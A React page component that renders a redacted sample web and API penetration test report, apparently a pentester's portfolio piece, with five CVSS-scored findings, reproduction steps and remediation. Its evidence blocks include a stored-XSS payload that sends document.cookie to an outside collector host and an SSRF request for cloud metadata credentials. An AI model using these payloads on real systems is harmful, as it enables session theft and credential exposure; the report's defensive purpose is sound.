import { useState } from 'react';
import { Link } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { ArrowLeft, Printer, ShieldAlert, FileText, Eye, EyeOff } from 'lucide-react';
import Navbar from '@/components/Navbar';
import Footer from '@/components/Footer';
import ScrollProgress from '@/components/ScrollProgress';
import BackToTop from '@/components/BackToTop';
import SEO from '@/components/SEO';

interface Finding {
  id: string;
  title: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low' | 'Info';
  cvss: string;
  vector: string;
  component: string;
  impact: string;
  reproduction: string[];
  request: string;
  remediation: string;
  status: 'Fixed' | 'Open' | 'Accepted risk';
}

const severityClass: Record<Finding['severity'], string> = {
  Critical: 'bg-red-500/15 text-red-400 border-red-500/40',
  High: 'bg-orange-500/15 text-orange-400 border-orange-500/40',
  Medium: 'bg-yellow-500/15 text-yellow-400 border-yellow-500/40',
  Low: 'bg-blue-500/15 text-blue-400 border-blue-500/40',
  Info: 'bg-muted text-muted-foreground border-border',
};

const findings: Finding[] = [
  {
    id: 'ACME-001',
    title: 'Broken object-level authorization exposes all tenant invoices',
    severity: 'Critical',
    cvss: '9.1',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N',
    component: 'GET /api/v2/invoices/{id}',
    impact:
      'Any authenticated user could read invoices belonging to any other tenant by incrementing a sequential identifier. 41,000 invoice records containing names, addresses and partial card data were reachable from a single trial account.',
    reproduction: [
      'Authenticate as a trial user in tenant A and note your own invoice id.',
      'Replay the request with an id belonging to tenant B (ids are sequential).',
      'Observe a 200 response containing the other tenant\u2019s invoice body.',
      'Iterate the id range to confirm enumeration at scale.',
    ],
    request: `GET /api/v2/invoices/48213 HTTP/1.1
Host: api.[REDACTED].com
Authorization: Bearer eyJhbGciOi[REDACTED]
Accept: application/json

HTTP/1.1 200 OK
{"id":48213,"tenant_id":"t_9f2[REDACTED]","customer":"[REDACTED]",
 "amount_due":18400,"card_last4":"[REDACTED]"}`,
    remediation:
      'Scope every invoice lookup to the caller\u2019s tenant at the data-access layer (WHERE tenant_id = :caller_tenant), not in the controller. Replace sequential ids with UUIDs as defence in depth and add a cross-tenant regression test to CI.',
    status: 'Fixed',
  },
  {
    id: 'ACME-002',
    title: 'Password reset token does not expire or rotate on use',
    severity: 'High',
    cvss: '8.1',
    vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N',
    component: 'POST /auth/reset/confirm',
    impact:
      'Reset tokens remained valid indefinitely and were reusable after a successful password change. A token recovered from a mailbox, log, or referrer header could take over the account months later.',
    reproduction: [
      'Request a password reset and capture the token from the email link.',
      'Complete the reset successfully.',
      'Replay the same token 24 hours later — it is still accepted.',
    ],
    request: `POST /auth/reset/confirm HTTP/1.1
Host: app.[REDACTED].com
Content-Type: application/json

{"token":"3f9a[REDACTED]","password":"Attacker!2026"}

HTTP/1.1 200 OK
{"status":"password_updated"}`,
    remediation:
      'Store reset tokens hashed with a 15-minute expiry, mark them consumed atomically on first use, and invalidate all outstanding sessions after a reset.',
    status: 'Fixed',
  },
  {
    id: 'ACME-003',
    title: 'Server-side request forgery in the webhook validator',
    severity: 'High',
    cvss: '7.7',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N',
    component: 'POST /api/v2/webhooks/test',
    impact:
      'The webhook test endpoint fetched arbitrary user-supplied URLs, including the cloud metadata service, returning the response body to the caller. Instance role credentials were retrievable.',
    reproduction: [
      'Create a webhook with the URL set to the cloud metadata endpoint.',
      'Trigger the test delivery.',
      'Read the metadata response reflected in the delivery log.',
    ],
    request: `POST /api/v2/webhooks/test HTTP/1.1
Host: api.[REDACTED].com
Authorization: Bearer eyJhbGciOi[REDACTED]

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/[REDACTED]"}

HTTP/1.1 200 OK
{"body":"{\\"AccessKeyId\\":\\"ASIA[REDACTED]\\", ... }"}`,
    remediation:
      'Resolve and validate the destination against an allowlist before connecting, block link-local and private ranges after DNS resolution, enforce IMDSv2, and never return the upstream response body to the caller.',
    status: 'Fixed',
  },
  {
    id: 'ACME-004',
    title: 'Stored cross-site scripting in the customer notes field',
    severity: 'Medium',
    cvss: '6.4',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N',
    component: 'Admin console — customer detail view',
    impact:
      'HTML supplied in a customer note was rendered unescaped in the admin console, allowing a low-privileged user to execute script in an administrator session.',
    reproduction: [
      'Save a note containing an inline event-handler payload as a standard user.',
      'View the customer record as an administrator.',
      'Script executes in the admin origin.',
    ],
    request: `POST /api/v2/customers/9931/notes HTTP/1.1
Host: api.[REDACTED].com

{"note":"<img src=x onerror=fetch('https://[REDACTED].oast.site/?c='+document.cookie)>"}`,
    remediation:
      'Escape on output rather than sanitising on input, render notes as text, and add a CSP with no unsafe-inline for the admin origin.',
    status: 'Fixed',
  },
  {
    id: 'ACME-005',
    title: 'Verbose error responses disclose stack traces and library versions',
    severity: 'Low',
    cvss: '3.7',
    vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N',
    component: 'API error handler (all routes)',
    impact:
      'Malformed payloads returned framework stack traces including file paths and dependency versions, accelerating targeted exploitation.',
    reproduction: [
      'Send a malformed JSON body to any API route.',
      'Observe the framework stack trace in the response.',
    ],
    request: `POST /api/v2/customers HTTP/1.1
Host: api.[REDACTED].com

{"name":

HTTP/1.1 500 Internal Server Error
{"error":"SyntaxError: Unexpected end of JSON input\\n at /srv/[REDACTED]/parser.js:118"}`,
    remediation: 'Return a generic error body in production and log the trace server-side with a correlation id.',
    status: 'Accepted risk',
  },
];

const counts = findings.reduce<Record<string, number>>((acc, f) => {
  acc[f.severity] = (acc[f.severity] || 0) + 1;
  return acc;
}, {});

const SampleReport = () => {
  const [open, setOpen] = useState<string | null>(findings[0].id);
  const [showAll, setShowAll] = useState(false);

  return (
    <div className="min-h-screen bg-background">
      <SEO
        title="Sample Penetration Test Report — Redacted"
        description="A fully redacted sample penetration test report: executive summary, CVSS-scored findings, reproduction steps and remediation guidance."
        canonical="/report"
        type="article"
      />
      <ScrollProgress />
      <Navbar />
      <BackToTop />

      <main className="container mx-auto px-6 pt-28 pb-20 max-w-4xl print-report">
        <div className="flex flex-wrap items-center justify-between gap-4 mb-8 no-print">
          <Link to="/" className="inline-flex items-center gap-2 text-sm text-muted-foreground hover:text-primary transition">
            <ArrowLeft className="w-4 h-4" /> Back to home
          </Link>
          <div className="flex gap-2">
            <button
              onClick={() => setShowAll((v) => !v)}
              className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg border border-border text-sm hover:border-primary/50 transition"
            >
              {showAll ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              {showAll ? 'Collapse all' : 'Expand all'}
            </button>
            <button
              onClick={() => window.print()}
              className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg border border-primary/40 bg-primary/10 text-primary text-sm hover:bg-primary/20 transition"
            >
              <Printer className="w-4 h-4" /> Print / PDF
            </button>
          </div>
        </div>

        <header className="pb-8 border-b border-border">
          <span className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-primary/30 bg-primary/10 text-xs font-mono text-primary mb-4">
            <FileText className="w-3 h-3" /> Redacted sample — client details removed
          </span>
          <h1 className="text-3xl md:text-4xl font-bold mb-3">Web &amp; API Penetration Test Report</h1>
          <dl className="grid sm:grid-cols-3 gap-4 mt-6 text-sm">
            <div>
              <dt className="text-muted-foreground font-mono text-xs">Client</dt>
              <dd>ACME [REDACTED] Ltd.</dd>
            </div>
            <div>
              <dt className="text-muted-foreground font-mono text-xs">Engagement window</dt>
              <dd>10 days, grey-box</dd>
            </div>
            <div>
              <dt className="text-muted-foreground font-mono text-xs">Standards</dt>
              <dd>OWASP WSTG · ASVS L2 · PTES</dd>
            </div>
          </dl>
        </header>

        <section className="py-8 border-b border-border">
          <h2 className="text-xl font-semibold mb-4">Executive summary</h2>
          <p className="text-muted-foreground leading-relaxed">
            The assessment identified five valid issues, one of which was critical. The critical finding allowed any
            authenticated user to read invoice records belonging to other tenants, exposing roughly 41,000 records with
            personal and partial payment data. Two high-severity issues — an immortal password-reset token and a
            server-side request forgery that returned cloud instance credentials — each provided a realistic account or
            infrastructure takeover path.
          </p>
          <p className="text-muted-foreground leading-relaxed mt-4">
            The root cause across the critical and high findings is consistent: authorization and destination validation
            are enforced in controllers rather than at the data-access and network layers. Four of five findings were
            remediated and verified during the free retest window; the remaining low-severity issue was formally
            accepted by the client.
          </p>
          <div className="flex flex-wrap gap-3 mt-6">
            {(['Critical', 'High', 'Medium', 'Low'] as const).map((s) => (
              <div key={s} className={`px-4 py-2 rounded-lg border text-sm font-mono ${severityClass[s]}`}>
                {counts[s] || 0} {s}
              </div>
            ))}
          </div>
        </section>

        <section className="py-8">
          <h2 className="text-xl font-semibold mb-6">Findings</h2>
          <div className="space-y-4">
            {findings.map((f) => {
              const isOpen = showAll || open === f.id;
              return (
                <div key={f.id} className="rounded-xl border border-border bg-card/40 overflow-hidden">
                  <button
                    onClick={() => setOpen(isOpen && !showAll ? null : f.id)}
                    className="w-full text-left p-4 flex items-start gap-3 hover:bg-card/70 transition"
                  >
                    <ShieldAlert className="w-4 h-4 text-primary shrink-0 mt-1" />
                    <span className="flex-1">
                      <span className="flex flex-wrap items-center gap-2">
                        <span className="font-mono text-xs text-muted-foreground">{f.id}</span>
                        <span className={`px-2 py-0.5 rounded-full border text-[10px] font-mono ${severityClass[f.severity]}`}>
                          {f.severity} · CVSS {f.cvss}
                        </span>
                        <span className="px-2 py-0.5 rounded-full border border-border text-[10px] font-mono text-muted-foreground">
                          {f.status}
                        </span>
                      </span>
                      <span className="block font-medium mt-2">{f.title}</span>
                      <span className="block text-xs font-mono text-muted-foreground mt-1">{f.component}</span>
                    </span>
                  </button>

                  <AnimatePresence initial={false}>
                    {isOpen && (
                      <motion.div
                        initial={{ height: 0, opacity: 0 }}
                        animate={{ height: 'auto', opacity: 1 }}
                        exit={{ height: 0, opacity: 0 }}
                        className="overflow-hidden"
                      >
                        <div className="px-4 pb-5 space-y-5 border-t border-border pt-4">
                          <div>
                            <h3 className="text-xs font-mono uppercase text-muted-foreground mb-2">CVSS vector</h3>
                            <code className="text-xs font-mono text-primary break-all">{f.vector}</code>
                          </div>
                          <div>
                            <h3 className="text-xs font-mono uppercase text-muted-foreground mb-2">Impact</h3>
                            <p className="text-sm text-muted-foreground">{f.impact}</p>
                          </div>
                          <div>
                            <h3 className="text-xs font-mono uppercase text-muted-foreground mb-2">Reproduction</h3>
                            <ol className="list-decimal list-inside space-y-1 text-sm text-muted-foreground">
                              {f.reproduction.map((r) => (
                                <li key={r}>{r}</li>
                              ))}
                            </ol>
                          </div>
                          <div>
                            <h3 className="text-xs font-mono uppercase text-muted-foreground mb-2">Evidence</h3>
                            <pre className="text-[11px] font-mono p-3 rounded-lg bg-background/80 border border-border overflow-x-auto whitespace-pre-wrap">
                              {f.request}
                            </pre>
                          </div>
                          <div>
                            <h3 className="text-xs font-mono uppercase text-muted-foreground mb-2">Remediation</h3>
                            <p className="text-sm text-muted-foreground">{f.remediation}</p>
                          </div>
                        </div>
                      </motion.div>
                    )}
                  </AnimatePresence>
                </div>
              );
            })}
          </div>
        </section>

        <section className="py-8 border-t border-border no-print text-center">
          <h2 className="text-2xl font-bold mb-3">Want a report like this for your stack?</h2>
          <p className="text-muted-foreground mb-6">Pick a service, or book a scoping call and I&apos;ll recommend one.</p>
          <div className="flex flex-wrap gap-3 justify-center">
            <Link to="/services" className="px-6 py-3 rounded-lg bg-primary text-primary-foreground font-medium hover:opacity-90 transition">
              Browse services
            </Link>
            <Link to="/#book" className="px-6 py-3 rounded-lg border border-border hover:border-primary/50 transition">
              Book a scoping call
            </Link>
          </div>
        </section>
      </main>
      <Footer />
    </div>
  );
};

export default SampleReport;
